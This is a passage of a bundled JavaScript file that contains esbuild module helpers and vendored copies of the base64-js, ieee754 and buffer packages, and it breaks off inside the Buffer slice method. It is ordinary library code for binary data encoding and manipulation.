"use strict";
var app = (() => {
  var __create = Object.create;
  var __defProp = Object.defineProperty;
  var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
  var __getOwnPropNames = Object.getOwnPropertyNames;
  var __getProtoOf = Object.getPrototypeOf;
  var __hasOwnProp = Object.prototype.hasOwnProperty;
  var __esm = (fn, res, err) => function __init() {
    if (err) throw err[0];
    try {
      return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
    } catch (e) {
      throw err = [e], e;
    }
  };
  var __commonJS = (cb, mod) => function __require() {
    try {
      return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
    } catch (e) {
      throw mod = 0, e;
    }
  };
  var __copyProps = (to, from, except, desc) => {
    if (from && typeof from === "object" || typeof from === "function") {
      for (let key of __getOwnPropNames(from))
        if (!__hasOwnProp.call(to, key) && key !== except)
          __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
    }
    return to;
  };
  var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
    // If the importer is in node compatibility mode or this is not an ESM
    // file that has been converted to a CommonJS file using a Babel-
    // compatible transform (i.e. "__esModule" has not been set), then set
    // "default" to the CommonJS "module.exports" for node compatibility.
    isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
    mod
  ));

  // node_modules/base64-js/index.js
  var require_base64_js = __commonJS({
    "node_modules/base64-js/index.js"(exports) {
      "use strict";
      init_buffer_shim();
      exports.byteLength = byteLength;
      exports.toByteArray = toByteArray;
      exports.fromByteArray = fromByteArray;
      var lookup = [];
      var revLookup = [];
      var Arr = typeof Uint8Array !== "undefined" ? Uint8Array : Array;
      var code = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
      for (i = 0, len = code.length; i < len; ++i) {
        lookup[i] = code[i];
        revLookup[code.charCodeAt(i)] = i;
      }
      var i;
      var len;
      revLookup["-".charCodeAt(0)] = 62;
      revLookup["_".charCodeAt(0)] = 63;
      function getLens(b64) {
        var len2 = b64.length;
        if (len2 % 4 > 0) {
          throw new Error("Invalid string. Length must be a multiple of 4");
        }
        var validLen = b64.indexOf("=");
        if (validLen === -1) validLen = len2;
        var placeHoldersLen = validLen === len2 ? 0 : 4 - validLen % 4;
        return [validLen, placeHoldersLen];
      }
      function byteLength(b64) {
        var lens = getLens(b64);
        var validLen = lens[0];
        var placeHoldersLen = lens[1];
        return (validLen + placeHoldersLen) * 3 / 4 - placeHoldersLen;
      }
      function _byteLength(b64, validLen, placeHoldersLen) {
        return (validLen + placeHoldersLen) * 3 / 4 - placeHoldersLen;
      }
      function toByteArray(b64) {
        var tmp;
        var lens = getLens(b64);
        var validLen = lens[0];
        var placeHoldersLen = lens[1];
        var arr = new Arr(_byteLength(b64, validLen, placeHoldersLen));
        var curByte = 0;
        var len2 = placeHoldersLen > 0 ? validLen - 4 : validLen;
        var i2;
        for (i2 = 0; i2 < len2; i2 += 4) {
          tmp = revLookup[b64.charCodeAt(i2)] << 18 | revLookup[b64.charCodeAt(i2 + 1)] << 12 | revLookup[b64.charCodeAt(i2 + 2)] << 6 | revLookup[b64.charCodeAt(i2 + 3)];
          arr[curByte++] = tmp >> 16 & 255;
          arr[curByte++] = tmp >> 8 & 255;
          arr[curByte++] = tmp & 255;
        }
        if (placeHoldersLen === 2) {
          tmp = revLookup[b64.charCodeAt(i2)] << 2 | revLookup[b64.charCodeAt(i2 + 1)] >> 4;
          arr[curByte++] = tmp & 255;
        }
        if (placeHoldersLen === 1) {
          tmp = revLookup[b64.charCodeAt(i2)] << 10 | revLookup[b64.charCodeAt(i2 + 1)] << 4 | revLookup[b64.charCodeAt(i2 + 2)] >> 2;
          arr[curByte++] = tmp >> 8 & 255;
          arr[curByte++] = tmp & 255;
        }
        return arr;
      }
      function tripletToBase64(num) {
        return lookup[num >> 18 & 63] + lookup[num >> 12 & 63] + lookup[num >> 6 & 63] + lookup[num & 63];
      }
      function encodeChunk(uint8, start, end) {
        var tmp;
        var output = [];
        for (var i2 = start; i2 < end; i2 += 3) {
          tmp = (uint8[i2] << 16 & 16711680) + (uint8[i2 + 1] << 8 & 65280) + (uint8[i2 + 2] & 255);
          output.push(tripletToBase64(tmp));
        }
        return output.join("");
      }
      function fromByteArray(uint8) {
        var tmp;
        var len2 = uint8.length;
        var extraBytes = len2 % 3;
        var parts = [];
        var maxChunkLength = 16383;
        for (var i2 = 0, len22 = len2 - extraBytes; i2 < len22; i2 += maxChunkLength) {
          parts.push(encodeChunk(uint8, i2, i2 + maxChunkLength > len22 ? len22 : i2 + maxChunkLength));
        }
        if (extraBytes === 1) {
          tmp = uint8[len2 - 1];
          parts.push(
            lookup[tmp >> 2] + lookup[tmp << 4 & 63] + "=="
          );
        } else if (extraBytes === 2) {
          tmp = (uint8[len2 - 2] << 8) + uint8[len2 - 1];
          parts.push(
            lookup[tmp >> 10] + lookup[tmp >> 4 & 63] + lookup[tmp << 2 & 63] + "="
          );
        }
        return parts.join("");
      }
    }
  });

  // node_modules/ieee754/index.js
  var require_ieee754 = __commonJS({
    "node_modules/ieee754/index.js"(exports) {
      init_buffer_shim();
      exports.read = function(buffer, offset, isLE, mLen, nBytes) {
        var e, m;
        var eLen = nBytes * 8 - mLen - 1;
        var eMax = (1 << eLen) - 1;
        var eBias = eMax >> 1;
        var nBits = -7;
        var i = isLE ? nBytes - 1 : 0;
        var d = isLE ? -1 : 1;
        var s = buffer[offset + i];
        i += d;
        e = s & (1 << -nBits) - 1;
        s >>= -nBits;
        nBits += eLen;
        for (; nBits > 0; e = e * 256 + buffer[offset + i], i += d, nBits -= 8) {
        }
        m = e & (1 << -nBits) - 1;
        e >>= -nBits;
        nBits += mLen;
        for (; nBits > 0; m = m * 256 + buffer[offset + i], i += d, nBits -= 8) {
        }
        if (e === 0) {
          e = 1 - eBias;
        } else if (e === eMax) {
          return m ? NaN : (s ? -1 : 1) * Infinity;
        } else {
          m = m + Math.pow(2, mLen);
          e = e - eBias;
        }
        return (s ? -1 : 1) * m * Math.pow(2, e - mLen);
      };
      exports.write = function(buffer, value, offset, isLE, mLen, nBytes) {
        var e, m, c;
        var eLen = nBytes * 8 - mLen - 1;
        var eMax = (1 << eLen) - 1;
        var eBias = eMax >> 1;
        var rt = mLen === 23 ? Math.pow(2, -24) - Math.pow(2, -77) : 0;
        var i = isLE ? 0 : nBytes - 1;
        var d = isLE ? 1 : -1;
        var s = value < 0 || value === 0 && 1 / value < 0 ? 1 : 0;
        value = Math.abs(value);
        if (isNaN(value) || value === Infinity) {
          m = isNaN(value) ? 1 : 0;
          e = eMax;
        } else {
          e = Math.floor(Math.log(value) / Math.LN2);
          if (value * (c = Math.pow(2, -e)) < 1) {
            e--;
            c *= 2;
          }
          if (e + eBias >= 1) {
            value += rt / c;
          } else {
            value += rt * Math.pow(2, 1 - eBias);
          }
          if (value * c >= 2) {
            e++;
            c /= 2;
          }
          if (e + eBias >= eMax) {
            m = 0;
            e = eMax;
          } else if (e + eBias >= 1) {
            m = (value * c - 1) * Math.pow(2, mLen);
            e = e + eBias;
          } else {
            m = value * Math.pow(2, eBias - 1) * Math.pow(2, mLen);
            e = 0;
          }
        }
        for (; mLen >= 8; buffer[offset + i] = m & 255, i += d, m /= 256, mLen -= 8) {
        }
        e = e << mLen | m;
        eLen += mLen;
        for (; eLen > 0; buffer[offset + i] = e & 255, i += d, e /= 256, eLen -= 8) {
        }
        buffer[offset + i - d] |= s * 128;
      };
    }
  });

  // node_modules/buffer/index.js
  var require_buffer = __commonJS({
    "node_modules/buffer/index.js"(exports) {
      "use strict";
      init_buffer_shim();
      var base64 = require_base64_js();
      var ieee754 = require_ieee754();
      var customInspectSymbol = typeof Symbol === "function" && typeof Symbol["for"] === "function" ? Symbol["for"]("nodejs.util.inspect.custom") : null;
      exports.Buffer = Buffer4;
      exports.SlowBuffer = SlowBuffer;
      exports.INSPECT_MAX_BYTES = 50;
      var K_MAX_LENGTH = 2147483647;
      exports.kMaxLength = K_MAX_LENGTH;
      Buffer4.TYPED_ARRAY_SUPPORT = typedArraySupport();
      if (!Buffer4.TYPED_ARRAY_SUPPORT && typeof console !== "undefined" && typeof console.error === "function") {
        console.error(
          "This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."
        );
      }
      function typedArraySupport() {
        try {
          const arr = new Uint8Array(1);
          const proto = { foo: function() {
            return 42;
          } };
          Object.setPrototypeOf(proto, Uint8Array.prototype);
          Object.setPrototypeOf(arr, proto);
          return arr.foo() === 42;
        } catch (e) {
          return false;
        }
      }
      Object.defineProperty(Buffer4.prototype, "parent", {
        enumerable: true,
        get: function() {
          if (!Buffer4.isBuffer(this)) return void 0;
          return this.buffer;
        }
      });
      Object.defineProperty(Buffer4.prototype, "offset", {
        enumerable: true,
        get: function() {
          if (!Buffer4.isBuffer(this)) return void 0;
          return this.byteOffset;
        }
      });
      function createBuffer(length) {
        if (length > K_MAX_LENGTH) {
          throw new RangeError('The value "' + length + '" is invalid for option "size"');
        }
        const buf = new Uint8Array(length);
        Object.setPrototypeOf(buf, Buffer4.prototype);
        return buf;
      }
      function Buffer4(arg, encodingOrOffset, length) {
        if (typeof arg === "number") {
          if (typeof encodingOrOffset === "string") {
            throw new TypeError(
              'The "string" argument must be of type string. Received type number'
            );
          }
          return allocUnsafe(arg);
        }
        return from(arg, encodingOrOffset, length);
      }
      Buffer4.poolSize = 8192;
      function from(value, encodingOrOffset, length) {
        if (typeof value === "string") {
          return fromString(value, encodingOrOffset);
        }
        if (ArrayBuffer.isView(value)) {
          return fromArrayView(value);
        }
        if (value == null) {
          throw new TypeError(
            "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof value
          );
        }
        if (isInstance(value, ArrayBuffer) || value && isInstance(value.buffer, ArrayBuffer)) {
          return fromArrayBuffer(value, encodingOrOffset, length);
        }
        if (typeof SharedArrayBuffer !== "undefined" && (isInstance(value, SharedArrayBuffer) || value && isInstance(value.buffer, SharedArrayBuffer))) {
          return fromArrayBuffer(value, encodingOrOffset, length);
        }
        if (typeof value === "number") {
          throw new TypeError(
            'The "value" argument must not be of type number. Received type number'
          );
        }
        const valueOf = value.valueOf && value.valueOf();
        if (valueOf != null && valueOf !== value) {
          return Buffer4.from(valueOf, encodingOrOffset, length);
        }
        const b = fromObject(value);
        if (b) return b;
        if (typeof Symbol !== "undefined" && Symbol.toPrimitive != null && typeof value[Symbol.toPrimitive] === "function") {
          return Buffer4.from(value[Symbol.toPrimitive]("string"), encodingOrOffset, length);
        }
        throw new TypeError(
          "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof value
        );
      }
      Buffer4.from = function(value, encodingOrOffset, length) {
        return from(value, encodingOrOffset, length);
      };
      Object.setPrototypeOf(Buffer4.prototype, Uint8Array.prototype);
      Object.setPrototypeOf(Buffer4, Uint8Array);
      function assertSize(size) {
        if (typeof size !== "number") {
          throw new TypeError('"size" argument must be of type number');
        } else if (size < 0) {
          throw new RangeError('The value "' + size + '" is invalid for option "size"');
        }
      }
      function alloc(size, fill, encoding) {
        assertSize(size);
        if (size <= 0) {
          return createBuffer(size);
        }
        if (fill !== void 0) {
          return typeof encoding === "string" ? createBuffer(size).fill(fill, encoding) : createBuffer(size).fill(fill);
        }
        return createBuffer(size);
      }
      Buffer4.alloc = function(size, fill, encoding) {
        return alloc(size, fill, encoding);
      };
      function allocUnsafe(size) {
        assertSize(size);
        return createBuffer(size < 0 ? 0 : checked(size) | 0);
      }
      Buffer4.allocUnsafe = function(size) {
        return allocUnsafe(size);
      };
      Buffer4.allocUnsafeSlow = function(size) {
        return allocUnsafe(size);
      };
      function fromString(string, encoding) {
        if (typeof encoding !== "string" || encoding === "") {
          encoding = "utf8";
        }
        if (!Buffer4.isEncoding(encoding)) {
          throw new TypeError("Unknown encoding: " + encoding);
        }
        const length = byteLength(string, encoding) | 0;
        let buf = createBuffer(length);
        const actual = buf.write(string, encoding);
        if (actual !== length) {
          buf = buf.slice(0, actual);
        }
        return buf;
      }
      function fromArrayLike(array) {
        const length = array.length < 0 ? 0 : checked(array.length) | 0;
        const buf = createBuffer(length);
        for (let i = 0; i < length; i += 1) {
          buf[i] = array[i] & 255;
        }
        return buf;
      }
      function fromArrayView(arrayView) {
        if (isInstance(arrayView, Uint8Array)) {
          const copy = new Uint8Array(arrayView);
          return fromArrayBuffer(copy.buffer, copy.byteOffset, copy.byteLength);
        }
        return fromArrayLike(arrayView);
      }
      function fromArrayBuffer(array, byteOffset, length) {
        if (byteOffset < 0 || array.byteLength < byteOffset) {
          throw new RangeError('"offset" is outside of buffer bounds');
        }
        if (array.byteLength < byteOffset + (length || 0)) {
          throw new RangeError('"length" is outside of buffer bounds');
        }
        let buf;
        if (byteOffset === void 0 && length === void 0) {
          buf = new Uint8Array(array);
        } else if (length === void 0) {
          buf = new Uint8Array(array, byteOffset);
        } else {
          buf = new Uint8Array(array, byteOffset, length);
        }
        Object.setPrototypeOf(buf, Buffer4.prototype);
        return buf;
      }
      function fromObject(obj) {
        if (Buffer4.isBuffer(obj)) {
          const len = checked(obj.length) | 0;
          const buf = createBuffer(len);
          if (buf.length === 0) {
            return buf;
          }
          obj.copy(buf, 0, 0, len);
          return buf;
        }
        if (obj.length !== void 0) {
          if (typeof obj.length !== "number" || numberIsNaN(obj.length)) {
            return createBuffer(0);
          }
          return fromArrayLike(obj);
        }
        if (obj.type === "Buffer" && Array.isArray(obj.data)) {
          return fromArrayLike(obj.data);
        }
      }
      function checked(length) {
        if (length >= K_MAX_LENGTH) {
          throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + K_MAX_LENGTH.toString(16) + " bytes");
        }
        return length | 0;
      }
      function SlowBuffer(length) {
        if (+length != length) {
          length = 0;
        }
        return Buffer4.alloc(+length);
      }
      Buffer4.isBuffer = function isBuffer(b) {
        return b != null && b._isBuffer === true && b !== Buffer4.prototype;
      };
      Buffer4.compare = function compare(a, b) {
        if (isInstance(a, Uint8Array)) a = Buffer4.from(a, a.offset, a.byteLength);
        if (isInstance(b, Uint8Array)) b = Buffer4.from(b, b.offset, b.byteLength);
        if (!Buffer4.isBuffer(a) || !Buffer4.isBuffer(b)) {
          throw new TypeError(
            'The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array'
          );
        }
        if (a === b) return 0;
        let x = a.length;
        let y = b.length;
        for (let i = 0, len = Math.min(x, y); i < len; ++i) {
          if (a[i] !== b[i]) {
            x = a[i];
            y = b[i];
            break;
          }
        }
        if (x < y) return -1;
        if (y < x) return 1;
        return 0;
      };
      Buffer4.isEncoding = function isEncoding(encoding) {
        switch (String(encoding).toLowerCase()) {
          case "hex":
          case "utf8":
          case "utf-8":
          case "ascii":
          case "latin1":
          case "binary":
          case "base64":
          case "ucs2":
          case "ucs-2":
          case "utf16le":
          case "utf-16le":
            return true;
          default:
            return false;
        }
      };
      Buffer4.concat = function concat(list, length) {
        if (!Array.isArray(list)) {
          throw new TypeError('"list" argument must be an Array of Buffers');
        }
        if (list.length === 0) {
          return Buffer4.alloc(0);
        }
        let i;
        if (length === void 0) {
          length = 0;
          for (i = 0; i < list.length; ++i) {
            length += list[i].length;
          }
        }
        const buffer = Buffer4.allocUnsafe(length);
        let pos = 0;
        for (i = 0; i < list.length; ++i) {
          let buf = list[i];
          if (isInstance(buf, Uint8Array)) {
            if (pos + buf.length > buffer.length) {
              if (!Buffer4.isBuffer(buf)) buf = Buffer4.from(buf);
              buf.copy(buffer, pos);
            } else {
              Uint8Array.prototype.set.call(
                buffer,
                buf,
                pos
              );
            }
          } else if (!Buffer4.isBuffer(buf)) {
            throw new TypeError('"list" argument must be an Array of Buffers');
          } else {
            buf.copy(buffer, pos);
          }
          pos += buf.length;
        }
        return buffer;
      };
      function byteLength(string, encoding) {
        if (Buffer4.isBuffer(string)) {
          return string.length;
        }
        if (ArrayBuffer.isView(string) || isInstance(string, ArrayBuffer)) {
          return string.byteLength;
        }
        if (typeof string !== "string") {
          throw new TypeError(
            'The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof string
          );
        }
        const len = string.length;
        const mustMatch = arguments.length > 2 && arguments[2] === true;
        if (!mustMatch && len === 0) return 0;
        let loweredCase = false;
        for (; ; ) {
          switch (encoding) {
            case "ascii":
            case "latin1":
            case "binary":
              return len;
            case "utf8":
            case "utf-8":
              return utf8ToBytes(string).length;
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
              return len * 2;
            case "hex":
              return len >>> 1;
            case "base64":
              return base64ToBytes(string).length;
            default:
              if (loweredCase) {
                return mustMatch ? -1 : utf8ToBytes(string).length;
              }
              encoding = ("" + encoding).toLowerCase();
              loweredCase = true;
          }
        }
      }
      Buffer4.byteLength = byteLength;
      function slowToString(encoding, start, end) {
        let loweredCase = false;
        if (start === void 0 || start < 0) {
          start = 0;
        }
        if (start > this.length) {
          return "";
        }
        if (end === void 0 || end > this.length) {
          end = this.length;
        }
        if (end <= 0) {
          return "";
        }
        end >>>= 0;
        start >>>= 0;
        if (end <= start) {
          return "";
        }
        if (!encoding) encoding = "utf8";
        while (true) {
          switch (encoding) {
            case "hex":
              return hexSlice(this, start, end);
            case "utf8":
            case "utf-8":
              return utf8Slice(this, start, end);
            case "ascii":
              return asciiSlice(this, start, end);
            case "latin1":
            case "binary":
              return latin1Slice(this, start, end);
            case "base64":
              return base64Slice(this, start, end);
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
              return utf16leSlice(this, start, end);
            default:
              if (loweredCase) throw new TypeError("Unknown encoding: " + encoding);
              encoding = (encoding + "").toLowerCase();
              loweredCase = true;
          }
        }
      }
      Buffer4.prototype._isBuffer = true;
      function swap(b, n, m) {
        const i = b[n];
        b[n] = b[m];
        b[m] = i;
      }
      Buffer4.prototype.swap16 = function swap16() {
        const len = this.length;
        if (len % 2 !== 0) {
          throw new RangeError("Buffer size must be a multiple of 16-bits");
        }
        for (let i = 0; i < len; i += 2) {
          swap(this, i, i + 1);
        }
        return this;
      };
      Buffer4.prototype.swap32 = function swap32() {
        const len = this.length;
        if (len % 4 !== 0) {
          throw new RangeError("Buffer size must be a multiple of 32-bits");
        }
        for (let i = 0; i < len; i += 4) {
          swap(this, i, i + 3);
          swap(this, i + 1, i + 2);
        }
        return this;
      };
      Buffer4.prototype.swap64 = function swap64() {
        const len = this.length;
        if (len % 8 !== 0) {
          throw new RangeError("Buffer size must be a multiple of 64-bits");
        }
        for (let i = 0; i < len; i += 8) {
          swap(this, i, i + 7);
          swap(this, i + 1, i + 6);
          swap(this, i + 2, i + 5);
          swap(this, i + 3, i + 4);
        }
        return this;
      };
      Buffer4.prototype.toString = function toString() {
        const length = this.length;
        if (length === 0) return "";
        if (arguments.length === 0) return utf8Slice(this, 0, length);
        return slowToString.apply(this, arguments);
      };
      Buffer4.prototype.toLocaleString = Buffer4.prototype.toString;
      Buffer4.prototype.equals = function equals(b) {
        if (!Buffer4.isBuffer(b)) throw new TypeError("Argument must be a Buffer");
        if (this === b) return true;
        return Buffer4.compare(this, b) === 0;
      };
      Buffer4.prototype.inspect = function inspect() {
        let str = "";
        const max = exports.INSPECT_MAX_BYTES;
        str = this.toString("hex", 0, max).replace(/(.{2})/g, "$1 ").trim();
        if (this.length > max) str += " ... ";
        return "<Buffer " + str + ">";
      };
      if (customInspectSymbol) {
        Buffer4.prototype[customInspectSymbol] = Buffer4.prototype.inspect;
      }
      Buffer4.prototype.compare = function compare(target, start, end, thisStart, thisEnd) {
        if (isInstance(target, Uint8Array)) {
          target = Buffer4.from(target, target.offset, target.byteLength);
        }
        if (!Buffer4.isBuffer(target)) {
          throw new TypeError(
            'The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof target
          );
        }
        if (start === void 0) {
          start = 0;
        }
        if (end === void 0) {
          end = target ? target.length : 0;
        }
        if (thisStart === void 0) {
          thisStart = 0;
        }
        if (thisEnd === void 0) {
          thisEnd = this.length;
        }
        if (start < 0 || end > target.length || thisStart < 0 || thisEnd > this.length) {
          throw new RangeError("out of range index");
        }
        if (thisStart >= thisEnd && start >= end) {
          return 0;
        }
        if (thisStart >= thisEnd) {
          return -1;
        }
        if (start >= end) {
          return 1;
        }
        start >>>= 0;
        end >>>= 0;
        thisStart >>>= 0;
        thisEnd >>>= 0;
        if (this === target) return 0;
        let x = thisEnd - thisStart;
        let y = end - start;
        const len = Math.min(x, y);
        const thisCopy = this.slice(thisStart, thisEnd);
        const targetCopy = target.slice(start, end);
        for (let i = 0; i < len; ++i) {
          if (thisCopy[i] !== targetCopy[i]) {
            x = thisCopy[i];
            y = targetCopy[i];
            break;
          }
        }
        if (x < y) return -1;
        if (y < x) return 1;
        return 0;
      };
      function bidirectionalIndexOf(buffer, val, byteOffset, encoding, dir) {
        if (buffer.length === 0) return -1;
        if (typeof byteOffset === "string") {
          encoding = byteOffset;
          byteOffset = 0;
        } else if (byteOffset > 2147483647) {
          byteOffset = 2147483647;
        } else if (byteOffset < -2147483648) {
          byteOffset = -2147483648;
        }
        byteOffset = +byteOffset;
        if (numberIsNaN(byteOffset)) {
          byteOffset = dir ? 0 : buffer.length - 1;
        }
        if (byteOffset < 0) byteOffset = buffer.length + byteOffset;
        if (byteOffset >= buffer.length) {
          if (dir) return -1;
          else byteOffset = buffer.length - 1;
        } else if (byteOffset < 0) {
          if (dir) byteOffset = 0;
          else return -1;
        }
        if (typeof val === "string") {
          val = Buffer4.from(val, encoding);
        }
        if (Buffer4.isBuffer(val)) {
          if (val.length === 0) {
            return -1;
          }
          return arrayIndexOf(buffer, val, byteOffset, encoding, dir);
        } else if (typeof val === "number") {
          val = val & 255;
          if (typeof Uint8Array.prototype.indexOf === "function") {
            if (dir) {
              return Uint8Array.prototype.indexOf.call(buffer, val, byteOffset);
            } else {
              return Uint8Array.prototype.lastIndexOf.call(buffer, val, byteOffset);
            }
          }
          return arrayIndexOf(buffer, [val], byteOffset, encoding, dir);
        }
        throw new TypeError("val must be string, number or Buffer");
      }
      function arrayIndexOf(arr, val, byteOffset, encoding, dir) {
        let indexSize = 1;
        let arrLength = arr.length;
        let valLength = val.length;
        if (encoding !== void 0) {
          encoding = String(encoding).toLowerCase();
          if (encoding === "ucs2" || encoding === "ucs-2" || encoding === "utf16le" || encoding === "utf-16le") {
            if (arr.length < 2 || val.length < 2) {
              return -1;
            }
            indexSize = 2;
            arrLength /= 2;
            valLength /= 2;
            byteOffset /= 2;
          }
        }
        function read(buf, i2) {
          if (indexSize === 1) {
            return buf[i2];
          } else {
            return buf.readUInt16BE(i2 * indexSize);
          }
        }
        let i;
        if (dir) {
          let foundIndex = -1;
          for (i = byteOffset; i < arrLength; i++) {
            if (read(arr, i) === read(val, foundIndex === -1 ? 0 : i - foundIndex)) {
              if (foundIndex === -1) foundIndex = i;
              if (i - foundIndex + 1 === valLength) return foundIndex * indexSize;
            } else {
              if (foundIndex !== -1) i -= i - foundIndex;
              foundIndex = -1;
            }
          }
        } else {
          if (byteOffset + valLength > arrLength) byteOffset = arrLength - valLength;
          for (i = byteOffset; i >= 0; i--) {
            let found = true;
            for (let j = 0; j < valLength; j++) {
              if (read(arr, i + j) !== read(val, j)) {
                found = false;
                break;
              }
            }
            if (found) return i;
          }
        }
        return -1;
      }
      Buffer4.prototype.includes = function includes(val, byteOffset, encoding) {
        return this.indexOf(val, byteOffset, encoding) !== -1;
      };
      Buffer4.prototype.indexOf = function indexOf(val, byteOffset, encoding) {
        return bidirectionalIndexOf(this, val, byteOffset, encoding, true);
      };
      Buffer4.prototype.lastIndexOf = function lastIndexOf(val, byteOffset, encoding) {
        return bidirectionalIndexOf(this, val, byteOffset, encoding, false);
      };
      function hexWrite(buf, string, offset, length) {
        offset = Number(offset) || 0;
        const remaining = buf.length - offset;
        if (!length) {
          length = remaining;
        } else {
          length = Number(length);
          if (length > remaining) {
            length = remaining;
          }
        }
        const strLen = string.length;
        if (length > strLen / 2) {
          length = strLen / 2;
        }
        let i;
        for (i = 0; i < length; ++i) {
          const parsed = parseInt(string.substr(i * 2, 2), 16);
          if (numberIsNaN(parsed)) return i;
          buf[offset + i] = parsed;
        }
        return i;
      }
      function utf8Write(buf, string, offset, length) {
        return blitBuffer(utf8ToBytes(string, buf.length - offset), buf, offset, length);
      }
      function asciiWrite(buf, string, offset, length) {
        return blitBuffer(asciiToBytes(string), buf, offset, length);
      }
      function base64Write(buf, string, offset, length) {
        return blitBuffer(base64ToBytes(string), buf, offset, length);
      }
      function ucs2Write(buf, string, offset, length) {
        return blitBuffer(utf16leToBytes(string, buf.length - offset), buf, offset, length);
      }
      Buffer4.prototype.write = function write(string, offset, length, encoding) {
        if (offset === void 0) {
          encoding = "utf8";
          length = this.length;
          offset = 0;
        } else if (length === void 0 && typeof offset === "string") {
          encoding = offset;
          length = this.length;
          offset = 0;
        } else if (isFinite(offset)) {
          offset = offset >>> 0;
          if (isFinite(length)) {
            length = length >>> 0;
            if (encoding === void 0) encoding = "utf8";
          } else {
            encoding = length;
            length = void 0;
          }
        } else {
          throw new Error(
            "Buffer.write(string, encoding, offset[, length]) is no longer supported"
          );
        }
        const remaining = this.length - offset;
        if (length === void 0 || length > remaining) length = remaining;
        if (string.length > 0 && (length < 0 || offset < 0) || offset > this.length) {
          throw new RangeError("Attempt to write outside buffer bounds");
        }
        if (!encoding) encoding = "utf8";
        let loweredCase = false;
        for (; ; ) {
          switch (encoding) {
            case "hex":
              return hexWrite(this, string, offset, length);
            case "utf8":
            case "utf-8":
              return utf8Write(this, string, offset, length);
            case "ascii":
            case "latin1":
            case "binary":
              return asciiWrite(this, string, offset, length);
            case "base64":
              return base64Write(this, string, offset, length);
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
              return ucs2Write(this, string, offset, length);
            default:
              if (loweredCase) throw new TypeError("Unknown encoding: " + encoding);
              encoding = ("" + encoding).toLowerCase();
              loweredCase = true;
          }
        }
      };
      Buffer4.prototype.toJSON = function toJSON() {
        return {
          type: "Buffer",
          data: Array.prototype.slice.call(this._arr || this, 0)
        };
      };
      function base64Slice(buf, start, end) {
        if (start === 0 && end === buf.length) {
          return base64.fromByteArray(buf);
        } else {
          return base64.fromByteArray(buf.slice(start, end));
        }
      }
      function utf8Slice(buf, start, end) {
        end = Math.min(buf.length, end);
        const res = [];
        let i = start;
        while (i < end) {
          const firstByte = buf[i];
          let codePoint = null;
          let bytesPerSequence = firstByte > 239 ? 4 : firstByte > 223 ? 3 : firstByte > 191 ? 2 : 1;
          if (i + bytesPerSequence <= end) {
            let secondByte, thirdByte, fourthByte, tempCodePoint;
            switch (bytesPerSequence) {
              case 1:
                if (firstByte < 128) {
                  codePoint = firstByte;
                }
                break;
              case 2:
                secondByte = buf[i + 1];
                if ((secondByte & 192) === 128) {
                  tempCodePoint = (firstByte & 31) << 6 | secondByte & 63;
                  if (tempCodePoint > 127) {
                    codePoint = tempCodePoint;
                  }
                }
                break;
              case 3:
                secondByte = buf[i + 1];
                thirdByte = buf[i + 2];
                if ((secondByte & 192) === 128 && (thirdByte & 192) === 128) {
                  tempCodePoint = (firstByte & 15) << 12 | (secondByte & 63) << 6 | thirdByte & 63;
                  if (tempCodePoint > 2047 && (tempCodePoint < 55296 || tempCodePoint > 57343)) {
                    codePoint = tempCodePoint;
                  }
                }
                break;
              case 4:
                secondByte = buf[i + 1];
                thirdByte = buf[i + 2];
                fourthByte = buf[i + 3];
                if ((secondByte & 192) === 128 && (thirdByte & 192) === 128 && (fourthByte & 192) === 128) {
                  tempCodePoint = (firstByte & 15) << 18 | (secondByte & 63) << 12 | (thirdByte & 63) << 6 | fourthByte & 63;
                  if (tempCodePoint > 65535 && tempCodePoint < 1114112) {
                    codePoint = tempCodePoint;
                  }
                }
            }
          }
          if (codePoint === null) {
            codePoint = 65533;
            bytesPerSequence = 1;
          } else if (codePoint > 65535) {
            codePoint -= 65536;
            res.push(codePoint >>> 10 & 1023 | 55296);
            codePoint = 56320 | codePoint & 1023;
          }
          res.push(codePoint);
          i += bytesPerSequence;
        }
        return decodeCodePointsArray(res);
      }
      var MAX_ARGUMENTS_LENGTH = 4096;
      function decodeCodePointsArray(codePoints) {
        const len = codePoints.length;
        if (len <= MAX_ARGUMENTS_LENGTH) {
          return String.fromCharCode.apply(String, codePoints);
        }
        let res = "";
        let i = 0;
        while (i < len) {
          res += String.fromCharCode.apply(
            String,
            codePoints.slice(i, i += MAX_ARGUMENTS_LENGTH)
          );
        }
        return res;
      }
      function asciiSlice(buf, start, end) {
        let ret = "";
        end = Math.min(buf.length, end);
        for (let i = start; i < end; ++i) {
          ret += String.fromCharCode(buf[i] & 127);
        }
        return ret;
      }
      function latin1Slice(buf, start, end) {
        let ret = "";
        end = Math.min(buf.length, end);
        for (let i = start; i < end; ++i) {
          ret += String.fromCharCode(buf[i]);
        }
        return ret;
      }
      function hexSlice(buf, start, end) {
        const len = buf.length;
        if (!start || start < 0) start = 0;
        if (!end || end < 0 || end > len) end = len;
        let out = "";
        for (let i = start; i < end; ++i) {
          out += hexSliceLookupTable[buf[i]];
        }
        return out;
      }
      function utf16leSlice(buf, start, end) {
        const bytes = buf.slice(start, end);
        let res = "";
        for (let i = 0; i < bytes.length - 1; i += 2) {
          res += String.fromCharCode(bytes[i] + bytes[i + 1] * 256);
        }
        return res;
      }
      Buffer4.prototype.slice = function slice(start, end) {
        const len = this.length;
        start = ~~start;
        end = end === void 0 ? len : ~~end;
        if (start < 0) {
          start += len;
          if (start < 0) start = 0;
